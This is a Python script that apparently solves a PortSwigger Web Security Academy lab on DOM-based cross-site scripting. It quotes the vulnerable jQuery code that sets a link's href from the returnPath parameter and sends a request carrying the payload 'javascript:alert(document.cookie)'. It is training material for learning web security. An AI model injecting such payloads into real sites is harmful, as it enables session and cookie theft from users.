'''
This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie.

Lab link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
'''

'''Vulnurable code
                        <script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>
'''

import requests


lab_id = '0a3000e304547314829b3d8c00e2003c' #change based on generated lab
payload = "javascript:alert(document.cookie)" # Insert into the href jquery directive
uri = f"https://{lab_id}.web-security-academy.net/feedback?returnPath={payload}" 

r = requests.get(uri)
print('done')